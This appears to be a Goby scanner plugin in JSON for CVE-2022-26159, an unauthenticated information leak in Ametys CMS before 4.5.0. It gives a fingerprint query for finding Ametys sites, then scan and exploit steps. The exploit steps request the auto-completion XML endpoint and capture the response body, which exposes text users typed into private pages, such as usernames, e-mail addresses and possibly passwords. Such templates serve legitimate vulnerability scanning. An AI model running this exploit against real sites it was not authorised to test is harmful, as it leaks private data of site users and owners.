{
      "Name": "Ametys CMS infoleak CVE-2022-26159",
      "Level": "1",
      "Tags": [
            "infoleak"
      ],
      "GobyQuery": "title=\"ametys\" || body=\"ametys\"",
      "Description": "Ametys is a Java-based open source CMS (Content Management System) combining rich content with an easy-to-use and intuitive interface.",
      "Product": "Ametys CMS",
      "Homepage": "https://www.ametys.org/",
      "Author": "",
      "Impact": "The auto-completion plugin in Ametys CMS before 4.5.0 allows a remote unauthenticated attacker to read documents such as plugins/web/service/search/auto-completion/&lt;domain&gt;/en.xml (and similar pathnames for other languages), which contain all characters typed by all users, including the content of private pages. For example, a private page may contain usernames, e-mail addresses, and possibly passwords.",
      "Recommendation": "https://issues.ametys.org/browse/CMS-10973",
      "References": [
            "https://nvd.nist.gov/vuln/detail/CVE-2022-26159",
            "https://issues.ametys.org/browse/CMS-10973"
      ],
      "HasExp": true,
      "ExpParams": null,
      "ExpTips": {
            "Type": "",
            "Content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/plugins/web/service/search/auto-completion/domain/en.xml?q=adm",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "item",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/plugins/web/service/search/auto-completion/domain/en.xml?q=adm",
                        "follow_redirect": true,
                        "header": null,
                        "data_type": "text",
                        "data": "",
                        "set_variable": []
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "&lt;item&gt;",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
                        "output|lastbody|concat|"
                  ]
            }
      ],
      "PostTime": "0000-00-00 00:00:00",
      "GobyVersion": "0.0.0"
}